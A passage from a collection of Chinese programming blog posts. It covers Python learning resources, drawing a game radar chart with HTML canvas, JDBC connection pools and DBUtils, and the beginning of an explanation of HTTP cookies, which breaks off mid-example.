WebP图片格式等。\n插件化。比如功能模块放在服务器上，按需下载，可以减少安装包大小。\n\n小结\n性能优化不是更新一两个版本就可以解决的，是持续性的需求，持续集成迭代反馈。在实际的项目中，在项目刚开始的时候，由于人力和项目完成时间限制，性能优化的优先级比较低，等进入项目投入使用阶段，就需要把优先级提高，但在项目初期，在设计架构方案时，性能优化的点也需要提早考虑进去，这就体现出一个程序员的技术功底了。\n什么时候开始有性能优化的需求，往往都是从发现问题开始，然后分析问题原因及背景，进而寻找最优解决方案，最终解决问题，这也是日常工作中常会用到的处理方式。\n"},{"title":"Python资料汇总（建议收藏）","body":"整理汇总，内容包括长期必备、入门教程、练手项目、学习视频。\n\n\n一、长期必备。\n1. StackOverflow，是疑难解答、bug排除必备网站，任何编程问题请第一时间到此网站查找。\nhttps://stackoverflow.com/\n\n2. github，是源码学习、版本控制不可缺少的网站，找源码学习请第一时间到此网站，fork之后自己维护。\nhttps://github.com/\n\n3. Awesome Python 最全的python资源，没有之一，绝对不容错过的python资源大全。\nhttps://github.com/vinta/awesome-python\n\n4. Awesome Python 的中文翻译\nhttps://github.com/jobbole/awesome-python-cn\n\n5. python中文学习大本营http://www.pythondoc.com/\n\n6. 伯乐在线网站http://python.jobbole.com/\n\n\n二、入门教程\n1. 笨方法学python，最受欢迎的python入门教程。边学边撸的教程。\n\n2. 简明python教程，简明是最大的特点\nhttp://old.sebug.net/paper/python/\n\n3. python菜鸟教程。\n\n4. 廖雪峰的python教程，重点讲述python和其它语言的不同，适合有其它语言基础的朋友。\n三、练手项目\n1. 自写一个分布式爬虫。比如爬取知乎全站/头条全站/豆瓣全站等等，任何一个你想爬取的网站。完成之后获得如下技能。用爬虫项目练手实在能学习许多知识。\n1.1. http协议知识，能学会如何封装http请求包。\n\n1.2. redis/mongo/mysql等各种数据库知识。nosql和sql的知识有多重要就不用多说了。\n\n1.3. scrapy爬虫神器的知识\n\n1.4 反爬虫知识。\n比如验证码识别，javascript混淆与还原，加密与解密，ajax异步请求，更换代理ip等等。\n\n1.5.谷歌开发人员工具。\n\n2. 人工智能方向，分别用k近邻、svm、神经网络等各种机器学习的方法识别mnist。这是人工智能的入门项目。\n\n3. 数据分析方向。[使用 Spark 和 D3.js 分析航班大数据]\n\n4. 25个练手项目由易到难，代码量从几十行到几千行，在实验环境里保证可以全部完成。\nhttp://www.360doc.com/content/16/0314/09/1513309_542022647.shtml\n\n\n四、视频教程。\nhttp://bbs.itheima.com/thread-336964-1-1.html\n\n转  IT老友"},{"title":"浅谈canvas绘画王者荣耀--雷达图","body":"\n\n背景：\n一日晚上下班的我静静的靠在角落上听着歌，这时\"滴!滴!\"手机上传来一阵qq消息。原来我人在问王者荣耀的雷达图在页面上如何做出来的，有人回答用canvas绘画。那么问题来了，已经好久没有使用canvas绘画了东西。\nSO，就想自己画一个canvas雷达图，顺便重新回顾一下canvas的知识点。\n\n王者荣耀雷达图的基本构成。\n聊天记录当中的雷达图不是特别清楚，所以我这边截图了自己的一个战绩雷达图。\n\n是不是有被我的战绩吓到了，害不害怕！\n好了扯远了，让我们回到正题上来。\n通过截图上面的雷达图基本主体是一个正六边形，每个顶点则配有相应的文字说明。\n然后就是中间红色区域部分则由对角线上的点，连成一圈填充构成。因此这里我们称它为数据填充区\n所以这个雷达图我们分为三步来完成。\n①正六边形\n②数据填充区\n③绘制文本\n正六变形的坐标点解析\n在绘画这个正六边形的时候，先让我们对于这个正六边形进行简单的数学分析。\n这里先用画板画一个正六变形，然后进行切割并切角。\n\n是吧，借用以前高中还是初中的数学，正六边形的内角和720°，那么每一个对角就是120°。在已知对角线的长度。那么通过sin60°，cos60°一类的，那个可以求出各个三角形的边长。\n可是问题来了，这里我们要计算的是各个坐标点。而canvas的坐标轴是从左上角算（0，0）原点的单象限坐标轴。假设六边形的中心点是（250，250）、对角线的长度是100*2，那么按照三角函数推断：\nbottom-center坐标：（250, 250 + 100）\nbottom-left坐标：（250 - 100*sin(60°), 250+100*cos(60°)）\ntop-left坐标：（250 - 100*sin(60°), 250-100*cos(60°)）\ntop-center坐标：（250, 250 - 100）\ntop-right坐标：（250 + 100*sin(60°), 250-100*cos(60°)）\nbottom-right的坐标：（250 + 100*sin(60°), 250+100*cos(60°)）\n\n坐标是出来了，但是一个点一个点去绘画是不是有点太low了！\n肿么办？\n啦啦啦啦！\n那么就到了我们找规律的时间来了！\n但是在找规律的同时，为毛中心点的X轴和别人不一样，为毛一会加一会减。\n所以当思考各坐标点参数的规律的时候，让先回顾以前的函数角度图表\n\n看完这个函数参照图之后，让我再次修改一下6个点的书写方式。\nbottom-center坐标：（250 + 100*sin(0°), 250 + 100*cos(0°)）\nbottom-left坐标：（250 + 100*sin(300°), 250+100*cos(300°)）\ntop-left坐标：（250 + 100*sin(240°), 250-100*cos(240°)）\ntop-center坐标：（250 +100*sin(180°), 250 + 100*cos(180°)）\ntop-right坐标：（250 + 100*sin(120°), 250-100*cos(120°)）\nbottom-right的坐标：（250 + 100*sin60°), 250+100*cos(60°)）\n这个时候再看组坐标数据点，是不是感觉有点意思！\n\n那么这个时候我们便可以通过一个for循环，用一个数组把这6个坐标点给记录下来。\nvar pointArr = [];\nfor (var i = 0; i < 6; i++) {\n        pointArr[i] = {};\n       pointArr[i].x = 250 + 100 * Math.sin(60 * i);\n        pointArr[i].y = 250 + 100* Math.cos(60 * i);\n    }\n1.1 绘画正六边形\n前面既然，将正六边形的坐标点通过一个for循环解析出来。那么就是代码绘画正六边形了：\n<style>\n        canvas {\n            display: block;\n            width: 500px;\n            height: 500px;\n        }\n</style>\n<body>\n    <canvas class=\"radar\"></canvas>\n</body>\n<script>\n    var canvas = document.getElementsByClassName('radar')[0];\n    canvas.width = 500;\n    canvas.height = 500;\n    var ctx = canvas.getContext('2d');\n    ctx.save();\n    ctx.strokeStyle = '#888888';  // 设置线条颜色\n    var lineArr = [];\n    var rAngle = Math.PI * 2 / 6;  // 算出每一个内角和\n    console.log(rAngle);\n    var rCenter = 250;  // 确定中心点\n    var curR = 100;   // 确定半径长度\n    ctx.beginPath();\n    for (var i = 0; i < 6; i++) {\n        lineArr[i] = {};\n        lineArr[i].y = rCenter + curR * Math.cos(rAngle * i);\n        lineArr[i].x = rCenter + curR * Math.sin(rAngle * i);\n        ctx.lineTo(lineArr[i].x, lineArr[i].y);\n    }\n    ctx.closePath();\n    ctx.stroke();\n    ctx.restore();\n\n啦啦啦！！！一个正六边形就这么的画出来。\n备注：这里rAngle这里是很灵活的，如果说画18正边形，就除以18，然后for循环18次就ok了.\n\n哈哈！！感觉发现了新大陆了！绘制正多边形的貌似可以按照这个规律来！！\n1.2 绘画对角线\n既然前面有一个数组存储各个坐标点，所以让每个对角线对角点直线想连就ok了！\nctx.strokeStyle = '#e8ddc7';  // PS吸管那么一吸\n    ctx.save();\n    ctx.beginPath();\n    // for (var j = 0; j < 3; j++) {\n    //     ctx.lineTo(lineArr[j].x, lineArr[j].y);\n    //     ctx.lineTo(lineArr[j+3].x, lineArr[j+3].y);\n    //     ctx.stroke();\n    // }\n    for (var j = 0; j < 3; j++) {\n        ctx.moveTo(lineArr[j].x, lineArr[j].y);\n        ctx.lineTo(lineArr[j + 3].x, lineArr[j + 3].y);\n        ctx.stroke();\n    }\n    ctx.closePath();\n    ctx.restore();\n\n2.1数据填充区\n关于数据填充区，也就是雷达图当中，不规则的红色半透明的六边形。其实就是就可以看做中心点，到各个边角点之间线段为一区间这。之后就是将这个区间分成若干份，你占这个这个区间多少份，满份就是边角点，零份就是原点。\n观察前面的雷达图当中，B等级大概占据某个等级的50%左右。而B前面还有等级A、S。\n所以当S等级时候，可以看作区间 / 1。\nB等级看作区间 / 2, 那么A就是 区间 / 1.5.\n以此类推就可以得出剩下 C 就是区间 / 2.5、D：区间/ 3\n这里我就不用for循环书写了，直接偷懒手写一个对象。\n// 绘制数据区域\nvar letterData = {\n        'S': 1,\n        'A': 1.5,\n        'B': 2,\n        'C': 2.5,\n        'D': 3\n    }\nctx.save();\nctx.beginPath();\nfor (var i = 0; i < 6; i++) {\n        lineArr[i].yEnd = rCenter + curR * Math.cos(rAngle * i) / (letterData[rData[i][1]]);\n        lineArr[i].xEnd = rCenter + curR * Math.sin(rAngle * i) / (letterData[rData[i][1]]);\n        ctx.lineTo(lineArr[i].xEnd, lineArr[i].yEnd); \n        console.log(lineArr);\n }\nctx.closePath();\nctx.stroke();\nctx.fillStyle = 'rgba(255, 0, 0, 0.5)'; \nctx.fill();\n\n2.2 对数据填充区域绘画小圆点和边长\n当我们回归到前面的截图发现，需要单独把数据填充区域的的各个点位置给加强，并把边角用更深的线条的描绘出来。\nctx.lineWidth = 2;  //设置数据填充区域的线条颜色\nctx.strokeStyle = '#dd3f26';  //设置填充区域的颜色\nvar point = 3; //设置数据填充区域的小圆点大小\nfor (var i = 0; i < 6; i++) {\n        ctx.beginPath();\n        ctx.arc(lineArr[i].xEnd, lineArr[i].yEnd, point, 0, Math.PI * 2); \n        ctx.fillStyle = 'rgba(255, 0, 0, 0.8)';\n        ctx.fill();\n        console.log(lineArr);\n    }\n    ctx.restore();\n\n3.1 绘制文本\n王者荣耀雷达文本是需要绘制两点，\n①用黑色16px字体绘制各点描述点\n②用红色30px字体绘制各点能力级别\n但是估计看到绘制文本，估计有的小伙伴就会说。不是有数组的存储各个边角的坐标，直接一个for循环依次根据各个点绘画出来不就OK了。\n // 绘制文本\n    var rData = [\n        ['生存', 'S'],\n        ['经济', 'S'],\n        ['输出', 'S'],\n        ['KDA', 'B'],\n        ['打野', 'B'],\n        ['推进', 'S']\n    ]\n    ctx.save();\n    ctx.font = '16px Microsoft Yahei';  //设置字体\n    ctx.fillStyle = '#000';  // 颜色\n    for (var i = 0; i < 6; i++) {\n        var y = rCenter + curR * Math.cos(rAngle * i);\n        var x = rCenter + curR * Math.sin(rAngle * i);\n        ctx.fillText(rData[i][0], x, y);\n    }\n    ctx.restore();\n浏览器最终显示的视觉效果：\n\n\n是不是觉得很惊喜，这里输出、经济位置勉强还行，但是剩下的文字位置就偏差了许多了。所以在绘制文字的时候，还得针对文字的坐标位置进行相应的调整。\n3.2 绘制文本--描述\n既然直接调用坐标的位置会出问题，那么让根据上文中的图片文字的规则简单分析。\n①如果X轴 == 中心点，那么就判断Y轴。比中心点大文字下移一点，反之文字上移一点。\n②如果X轴 < 中心点，那么文字X轴位置就左移动一点,反正右移动距离。\n // 绘制文本\n    ctx.save();\n    var fontSize = 16;\n    ctx.font =  fontSize + 'px Microsoft Yahei';\n    ctx.textBaseline=\"middle\"; //设置基线参考点\n    ctx.textAlign=\"center\";  // 文本居中\n    ctx.fillStyle = '#000';\n    for (var i = 0; i < 6; i++) {\n        var y = rCenter + curR * Math.cos(rAngle * i);\n        var x = rCenter + curR * Math.sin(rAngle * i);\n        console.log(Math.sin(rAngle * i))\n        var s_width = ctx.measureText(rData[i][0]).width; //获取当前绘画的字体宽度\n        if ( x == rCenter) {\n            if (y > rCenter ) {\n                ctx.fillText(rData[i][0], x - s_width/2, y + fontSize);\n            } else {\n                ctx.fillText(rData[i][0], x - s_width/2, y - fontSize);\n            }\n        } else if ( x > rCenter) {\n            console.log(rData[i][0]);\n            ctx.fillText(rData[i][0], x + s_width*1.5, y);\n        } else {\n             ctx.fillText(rData[i][0], x - s_width*1.5, y);\n        }\n\n这里多了好几个不常用的属性，下面就是介绍这些属性的特点：\nctx.textBaseline: 设置或返回在绘制文本时使用的当前文本基线\n说到基线，各位童鞋想一想咱们以前英文练习本，上面有着一条条线条\n\n瞬间回忆到当年被罚抄英语单词的岁月，一把辛酸泪呀。\n\n网页设计字体也有一个基线的存在，因此canvas的基线点就是直接从坐标点划出一条横线基线。\n这里从网络上截图一张，通过设置基线参考位置，看看文本所在位置的改变。\n\nctx.textAlign: 这个文本水平居中，不过和CSS当中的居中不一样的是，他是从坐标点划出一条竖线分割文本的。\n\nctx.measureText : 返回包含指定文本宽度的对象。\n通俗一点的就是说，就是获取你绘制文本的宽度。假设一排文字内容为'Hello World'， size为16px大小文本。在这里高度都是16px稳定不变，这样canvas画其他元素对这个位置只需要Y轴移动这个文本的'size'大小就可以避免覆盖到上面。\n但是如果要X轴去移动位置,你根本不知道'Hello World'这串文本的长度。那么这个时候就需要ctx.measureText这个方法，获取当前你绘制文本的宽度。\n3.2 绘制文本--能力级别\n既然前面已经介绍了描述的绘画方法，那么依葫芦画瓢。让我们一并开始绘制能力级别的文本。\n// 绘制文本\n    ctx.save();\n    var fontSize = 16;\n    var maxfontSize = 30;\n    ctx.font =  fontSize + 'px Microsoft Yahei';\n    ctx.textBaseline=\"middle\";\n    ctx.textAlign=\"center\";\n    for (var i = 0; i < 6; i++) {\n        var y = rCenter + curR * Math.cos(rAngle * i);\n        var x = rCenter + curR * Math.sin(rAngle * i);\n        console.log(Math.sin(rAngle * i))\n        var s_width = ctx.measureText(rData[i][0]).width;\n        if ( x == rCenter) {\n            if (y > rCenter ) {\n                ctx.fillText(rData[i][0], x - s_width/2, y + fontSize);\n            } else {\n                ctx.fillText(rData[i][0], x - s_width/2, y - fontSize);\n            }\n        } else if ( x > rCenter) {\n            console.log(rData[i][0]);\n            ctx.fillText(rData[i][0], x + s_width*1.5, y);\n        } else {\n             ctx.fillText(rData[i][0], x - s_width*1.5, y);\n        }\n    }\n    ctx.restore();\n    ctx.save(); \n// 绘制等级\n    ctx.font = '30px Microsoft Yahei bold';\n    ctx.fillStyle = '#d7431f';\n    ctx.textBaseline=\"middle\";\n    ctx.textAlign=\"center\";\n    for (var i = 0; i < 6; i++) {\n        var y = rCenter + curR * Math.cos(rAngle * i);\n        var x = rCenter + curR * Math.sin(rAngle * i);\n        var M_width = ctx.measureText(rData[i][1]).width;\n        if ( x == rCenter) {\n            if (y > rCenter ) {\n                ctx.fillText(rData[i][1], x + M_width/2, y + fontSize);\n            } else {\n                ctx.fillText(rData[i][1], x + M_width/2, y - fontSize);\n            }\n        } else if ( x > rCenter) {\n            console.log(rData[i][0]);\n            ctx.fillText(rData[i][1], x + M_width, y);\n        } else {\n             ctx.fillText(rData[i][1], x - M_width, y);\n        }\n    }\n    ctx.restore();\n    ctx.save();\n页面最终效果：\n\n\n结尾\n好了！以上就是鄙人对于canvas绘画一点简单理解与复习了，其中也回顾了一些canvas基本属性点。后续如何用canvas玩出各种花样就看各位看官自己了！\n小贴士：\n在使用ctx.measureText这个方法的时候需要注意一下。这个方法在宽度参考对象也跟当前绘画环境的font-size有关联的。\n打个比方说，在绘制描述的文本的时候。font-size设置是16px，那么ctx.measureText('输出').width 是32。\n那么在绘制能力等级的时候，font-size设置是32，那么ctx.measureText('输出').width 就不再是32了而是64或者。\n贴士2：\n这里顺便帮做设计朋友推广他的一个微信H5视频案例，全程水墨画武侠风，画工炒鸡棒棒。\n\n\n另外前面loading动画宝剑出鞘css3部分，利用极少transform3d代码完成。感兴趣的童鞋可以微信扫一扫，看一下运动轨迹就心中估计就能猜出运行的的css3代码了。\n\n原创文章，文笔有限，才疏学浅，文中若有不正之处，再次再次再次欢迎各位啪啪的打脸赐教。（有句话说的好，重要的词得说三遍。）\n\n我是车大棒！我为我自己……emmmmmmm，今天就不自己带眼了，为朋友插眼吧！\n"},{"title":"JAVA基础-JDBC二（常用的开源工具）","body":"\n一、连接池\n　　在实际的开发应用中，我们常常会对数据库进行大量的高并发的访问，而最原始的连接和操作方式并不能满足这种大量的访问，程序员为了追求更方便、更快捷、更科学安全的开发。第三方的工具类和Dao层的框架就应运而生了。DBCP连接池、和C3P0连接池就是2个常见的开源数据库连接池。\t　　在与数据库进行交互的过程中，获得连接”和“释放资源”是非常消耗系统资源的两个过程，为了解决此类性能问题，通常情况我们采用连接池技术，来共享连接Connection。这样我们就不需要每次都创建连接、释放连接了，这些操作都交给了连接池。用的时候从连接池里拿出来，用完了在给他放回去，下次使用时还可以接着用。\t　　同数据库的链接规范（JDBC）一样,java为数据库连接池也提供了一套规范（接口）- javax.sql.DataSource，各个厂商需要让自己的连接池实现这个接口。这样就方便了应用程序的扩展和我们的使用。\n（一）DBCP连接池\t\n　　DBCP连接池他是一个开源的连接池，属于Apache家族的一员，为Tomcat的内置连接池（自己的土，自己的地...）1、导入炸包\t　　使用第三方工具类的第一件事就是导入jar包，然后Build Patch一下，为了方便jar包的管理（另一方面满足于强迫症患者的整理欲望）一般都在工程下新建一个lib文件夹用来存放炸包。\t　　需要导入的jar包：\t　　* commons-dbcp-1.4.jar\t　　* commons-pool-1.5.6.jar\n2、DBCP连接池的使用\n 　　连接数据库的操作是一个频繁使用，代码重复的操作，可以将其抽取成一个工具类。\t　　Java为数据库连接池也提供了一套规范接口：DataSource，它是java中提供的连接池，作为 DriverManager 工具的替代项。而DBCP包则提供了DataSource接口的实现类 - BasicDataSource类。\n  栗子：\n\npublic class JdbcUtils {\n//定义一个连接池\nprivate static BasicDataSource bd = new BasicDataSource();\n//工具类，私有他的无参构造\nprivate JdbcUtils() {\nsuper();\n}\n//使用静态代码块进行连接池的属性配置 \n//静态代码块是随着类的加载而加载的且只加载一次（节省资源）\nstatic {\n/*\n* 必须设置的项\n*/\n//设置mySQL的驱动\nbd.setDriverClassName(\"com.mysql.jdbc.Driver\");\n//设置要连接数据库的URL\nbd.setUrl(\"jdbc:mysql://localhost:3306/mydb\");\n//设置用户名\nbd.setUsername(\"root\");\n//设置数据库密码\nbd.setPassword(\"root\");\n/*\n* 选择设置的项，不设置的话会有默认值跟着\n*/\n//初始化连接数\nbd.setInitialSize(10);\n//最大连接数\nbd.setMaxActive(15);\n//最大空闲连接数\nbd.setMaxIdle(6);\n//最小空闲连接数\nbd.setMinIdle(3);\n}\n/**\n* 获取连接池对象\n* @return bd 连接池\n*/\npublic static DataSource getDataSource() {\nreturn bd;\n}\n}\n\n（二）C3P0连接池\n 　　C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate，Spring等。（百度百科）\t　　C3P0连接池有自动回收空闲连接的功能，而DBCP没有自动回收空闲连接的功能。1、导入jar包\t　　同DBCP的使用步骤一样，第一步要导入相关的jar包：\t　　c3p0-0.9.1.2.jar2、C3P0连接池的使用\t　　通过查看帮助文档（doc目录下的index.html文件里边有个快速入门）发现C3P0可以通过手动或者配置文件的方式使用。\n 　　 * 通过手动进行配置\n\npublic static void main(String[] args) throws Exception {\n// 获得C3P0连接池对象\nComboPooledDataSource source = new ComboPooledDataSource();\n// 设置驱动\nsource.setDriverClass(\"com.mysql.jdbc.Driver\");\n// 设置连接库的路径\nsource.setJdbcUrl(\"jdbc:mysql:///mydb\");\n// 设置用户名\nsource.setUser(\"root\");\n// 设置密码\nsource.setPassword(\"root\");\n// 通过连接池创建一个QueryRunner对象\nQueryRunner runner = new QueryRunner(source);\n// 测试\nString sql = \"SELECT * FROM users\";\nList<Object[]> list = runner.query(sql, new ArrayListHandler());\nfor (Object[] objects : list) {\nfor (Object object : objects) {\nSystem.out.print(object + \" \");\n}\nSystem.out.println();\n}\n}\n\n 　　\n　　* 通过配置文件进行配置\t　　C3P0连接池支持.xml和属性文件.properties的文件配置，当然了他对其配置文件的名字和里边的文件也有一定的要求（搞一个别的名他就不认识了），XML配置文件的名字一定是c3p0-config.xml，属性配置文件的名字一定是c3p0.properties.默认情况下C3P0连接池就会找类加载路径下的c3p0-config.xml进行解析。c3p0-config.xml配置文件除了一些链接数据库的一些必要属性外也可以配置一些连接池其他的属性：最小池里的数量，最大池里的数量等。具体的属性配置可以百度或者阅读开发文档。\n　　栗子：  * c3p0-config.xml配置文件\n\n<c3p0-config>\n<default-config>\n<property name=\"driverClass\">com.mysql.jdbc.Driver</property>\n<property name=\"jdbcUrl\">jdbc:mysql:///mydb</property>\n<property name=\"user\">root</property>\n<property name=\"password\">root</property>\n</default-config>\n</c3p0-config>\n\n  * C3P0的工具类\n\npublic class C3p0Utils {\n// 定义一个c3p0连接池\nprivate static ComboPooledDataSource source;\n// 定义一个连接对象\nprivate static Connection connection;\n\nprivate C3p0Utils() {\nsuper();\n}\n\nstatic {\n// 初始化连接池\nsource = new ComboPooledDataSource();\ntry {\n// 获得一个连接\nconnection = source.getConnection();\n} catch (Exception e) {\n// TODO Auto-generated catch block\ne.printStackTrace();\n}\n}\n\npublic static Connection getConnection() {\nreturn connection;\n}\n}\n\n 　　通过代码演示可以看到通过配置文件的方式还是非常方便的，后期维护的话只要改相关的配置文件就可以了，xml作为配置文件便于我们的阅读，所以推荐使用c3p0-config.xml配置文件。\n二、DBUtils工具类\t\n　　使用原生的JDBC进行开发，你会发现代码冗余过多，使用麻烦，极度不爽。而工具类的出现就是为了简化我们的开发。DBUtils是apache commons组件一个成员，使用DBUtils工具类首先要导入相关的jar包 - commons-dbutils-1.6.jar。\t　　DBUtils封装并简化了JDBC操作，减少了相关代码的书写、它一共有3个核心的部分组成：\t　　* QueryRunner提供对sql语句操作的API。\t　　* ResultSetHandler接口提供了执行完sql语句后怎样封装结果集。\t　　* DbUtils工具类提供了关闭相关资源和处理事物的方法。1、QueryRunner核心类\t　　* new QueryRunner() ，无参构造，使用无参构造时，调用update，query方法时需要传入Connection对象\t　　* update(Connection conn, String sql, Object... params) ，用来完成表数据的增加、删除、更新操作。\t　　* query(Connection conn, String sql, ResultSetHandler<T> rsh, Object... params) ，用来完成表数据的查询操作。------------------------------------------------------------------------------------------------------------------------------------------------------------------\t　　* new QueryRunner(DataSource ds) ，带参构造，使用带参构造时调用update，query方法无需要传入Connection对象\t　　* update(String sql, Object... params) ，用来完成表数据的增加、删除、更新操作。\t　　* query(String sql, ResultSetHandler<T> rsh, Object... params) ，用来完成表数据的查询操作。\n\t　　栗子：  * 无参构造的update方法\n\n/**\n* 增加操作\n* @throws SQLException\n*/\nprivate static void method01() throws SQLException {\n// 通过工具类获得连接\nConnection connection = JdbcUtilsConfig.getConnection();\n// 获得QueryRunner对象\nQueryRunner runner = new QueryRunner();\n// 编写sql语句\nString insert = \"INSERT INTO sort(sname,sprice,sdesc) VALUES(?,?,?)\";\n// 执行update方法，也可以将数据存到Object数组里然后传入数组，返回值为影响的行数\nint update = runner.update(connection, insert, \"家具\", 1000, \"很好用\");\nSystem.out.println(update);\n}\n\n/**\n* 更新操作\n* \n* @throws SQLException\n*/\nprivate static void method02() throws SQLException {\n// 通过工具类获得连接\nConnection connection = JdbcUtilsConfig.getConnection();\n// 获得QueryRunner对象\nQueryRunner runner = new QueryRunner();\n// 编写sql语句\nString s = \"UPDATE sort SET sname=?,sprice=?,sdesc=? WHERE sid=4\";\n// 执行update方法\nrunner.update(connection, s, \"花卉\", 100, \"买给你爱的人\");\n//安静的关闭\nDbUtils.closeQuietly(connection);\n}\n\n/**\n* 删除操作\n* \n* @throws SQLException\n*/\nprivate static void method03() throws SQLException {\n// 通过工具类获得连接\nConnection connection = JdbcUtilsConfig.getConnection();\n// 创建一个QueryRunner对象，用来完成SQL语句的执行\nQueryRunner qr = new QueryRunner();\n// 执行SQL语句\nString sql = \"DELETE FROM zhangwu WHERE name = ?\";\nObject[] params = { \"股票收入\" };\nint line = qr.update(connection, sql, params);\n// 结果集的处理，影响的行数\nSystem.out.println(\"line=\" + line);\n}\n\n \n　　* 有参构造的query方法\n\npublic static void main(String[] args) throws Exception {\n// 通过工具类获得连接池对象\nDataSource dataSource = C3p0Utils.getDataSource();\n// 通过连接池创建一个QueryRunner对象\nQueryRunner runner = new QueryRunner(dataSource);\n// 编写sql语句\nString sql = \"SELECT * FROM users\";\n// 执行query方法传入ArrayListHandler返回集合\nList<Object[]> list = runner.query(sql, new ArrayListHandler());\n// 遍历集合\nfor (Object[] objects : list) {\nfor (Object object : objects) {\nSystem.out.print(object + \" \");\n}\nSystem.out.println();\n}\n}\n\n \n2、ResultSetHandler结果集处理类\t　　* ArrayHandler  将结果集中的第一条记录封装到一个Object[]数组中，数组中的每一个元素就是这条记录的值。\t　　* ArrayListHandler  将结果集中的每一条记录都封装到一个Object[]数组中，将这些数组在封装到List集合中。\t　　* BeanHandler  将结果集中第一条记录封装到一个指定的javaBean中。\t　　* BeanListHandler  将结果集中每一条记录封装到指定的javaBean中，将这些javaBean在封装到List集合中。\t　　* ColumnListHandler  将结果集中指定的列的字段值，封装到一个List集合中。\t　　* ScalarHandler  它是用于单数据。例如sql中的聚合函数SUM(),Count()等。\t　　* MapHandler  将结果集第一行封装到Map集合中,Key 列名, Value 该列数据，可以配合工具类BeanUtils.populate(Bean bean, Map map);一起使用方便数据的封装。\t　　* MapListHandler  将结果集第一行封装到Map集合中,Key 列名, Value 该列数据,Map集合存储到List集合。\t\t　　常用Handler举例:  *BeanHandler的栗子：\n\n/**\n     * 商品详情查询\n     * \n     * @param pid\n     * @return product\n     * @throws Exception\n     */\n    @Override\n    public Product findByPid(String pid) throws Exception {\n        //通过连接池创建QueryRunner对象\n        QueryRunner queryRunner = new QueryRunner(C3p0Utils.getDataSourse());\n        //根据传入的商品ID编写sql语句\n        String sql = \"SELECT * FROM product WHERE pid=?\";\n        //传入sql语句和BeanHandler结果集返回商品Bean\n        Product product = queryRunner.query(sql, new BeanHandler<Product>(Product.class), pid);\n        return product;\n    }\n\n  * ScalarHandler的栗子：\n\n    /**\n     * 商品总数查询\n     * @return totalCount\n     * @throws Exception\n     */\n    @Override\n    public Integer findAdmintotalCount() throws Exception {\n        QueryRunner queryRunner = new QueryRunner(C3p0Utils.getDataSourse());\n        //pflag字段为是否下架\n        String sql = \"SELECT COUNT(*) FROM product WHERE pflag=?\";\n        Long totalCount = (Long) queryRunner.query(sql, new ScalarHandler(),Product.UN_FLAG);\n        //将Long转换成Integer类型返回\n        return totalCount.intValue();\n    }\n\n  * BeanListHandler的栗子：\n\n/**\n     * 根据类别查询商品\n     * \n     * @param cid 商品ID\n     * @param beginPage 起始页\n     * @param pageSize 每页显示的条数\n     * @return list\n     * @throws Exception\n     */\n    @Override\n    public List<Product> findPageByCid(String cid, Integer beginPage, Integer pageSize) throws Exception {\n        QueryRunner queryRunner = new QueryRunner(C3p0Utils.getDataSourse());\n        //分页查询\n        String sql = \"SELECT * FROM product WHERE cid=? AND pflag=? LIMIT ?,?\";\n        //BeanListHandler里泛型要写你查询实体Bean类型，传入参数为Bean.class\n        List<Product> list = queryRunner.query(sql, new BeanListHandler<Product>(Product.class), cid, Product.UN_FLAG,\n                beginPage, pageSize);\n        //返回结合\n        return list;\n    }\n\n \n3、DbUtils工具类\t　　此类提供了关闭相关资源和处理事物的方法：\t　　* DbUtils.closeQuietly()  安静的关闭资源。"},{"title":"这一次带你彻底了解Cookie","body":"前言\n网络早期最大的问题之一是如何管理状态。简而言之，服务器无法知道两个请求是否来自同一个浏览器。当时最简单的方法是在请求时，在页面中插入一些参数，并在下一个请求中传回参数。这需要使用包含参数的隐藏的表单，或者作为URL参数的一部分传递。这两个解决方案都手动操作，容易出错。\n网景公司当时一名员工Lou Montulli，在1994年将“cookies”的概念应用于网络通信，用来解决用户网上购物的购物车历史记录，目前所有浏览器都支持cookies。\ncookie是什么\ncookie翻译过来是“饼干，甜品”的意思，cookie在网络应用中到处存在，当我们浏览之前访问过的网站，网页中可能会显示：你好，王三少，这就会让我们感觉很亲切，像吃了一块很甜的饼干一样。\n由于http是无状态的协议，一旦客户端和服务器的数据交换完毕，就会断开连接，再次请求，会重新连接，这就说明服务器单从网络连接上是没有办法知道用户身份的。怎么办呢？那就给每次新的用户请求时，给它颁发一个身份证（独一无二）吧，下次访问，必须带上身份证，这样服务器就会知道是谁来访问了，针对不同用户，做出不同的响应。，这就是Cookie的原理。\n其实cookie是一个很小的文本文件，是浏览器储存在用户的机器上的。Cookie是纯文本，没有可执行代码。储存一些服务器需要的信息，每次请求站点，会发送相应的cookie，这些cookie可以用来辨别用户身份信息等作用。\n\n如图所示,用户首次访问服务器，服务器会返回一个独一无二的识别码；id=23451，这样服务器可以用这个码跟踪记录用户的信息，（购物历史，地址信息等）。\ncookie可以包含任意的信息，不仅仅是id，客户端会记录服务器返回来的Set-Cookie首部中的cookie内容。并将cookie存储在浏览器的cookie数据库中，当用户访问同一站点时，浏览器就会挑选当时该站点颁发的id=XXX的身份证（cookie），并在Cookie请求首部发送过去。\ncookie的类型\n可以按照过期时间分为两类：会话cookie和持久cookie。会话cookie是一种临时cookie，用户退出浏览器，会话Cookie就会被删除了，持久cookie则会储存在硬盘里，保留时间更长，关闭浏览器，重启电脑，它依然存在，通常是持久性的cookie会维护某一个用户周期性访问服务器的配置文件或者登录信息。\n\n持久cookie 设置一个特定的过期时间（Expires）或者有效期（Max-Age）\n\n\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2019 07:28:00 GMT;\n\ncookie的属性\ncookie的域\n产生Cookie的服务器可以向set-Cookie响应首部添加一个Domain属性来控制哪些站点可以看到那个cookie，例如下面：\n\nSet-Cookie: name=\"wang\"; domain=\"m.zhuanzhuan.58.com\"\n\n如果用户访问的是m.zhuanzhuan.58.com那就会发送cookie: name=\"wang\", 如果用户访问www.aaa.com（非zhuanzhuan.58.com）就不会发送这个Cookie。\ncookie的路径 Path\nPath属性可以为服务器特定文档指定Cookie，这个属性设置的url且带有这个前缀的url路径都是有效的。\n例如：m.zhuanzhuan.58.com 和 m.zhaunzhuan.58.com/user/这两个url。 m.zhuanzhuan.58.com 设置cookie\n\nSet-cookie: id=\"123432\";domain=\"m.zhuanzhuan.58.com\";\n\nm.zhaunzhuan.58.com/user/ 设置cookie：\n\nSet-cookie：user=\"wang\", domain=\"m.zhuanzhuan.58.com\"; path=/user/\n\n但是访问其他路径m.zhuanzhuan.58.com/other/就会获得\n\ncookie: id=\"123432\"\n\n如果访问m.zhuanzhuan.58.com/user/就会获得\n\n  cookie: id=\"123432\"\n  cookie: 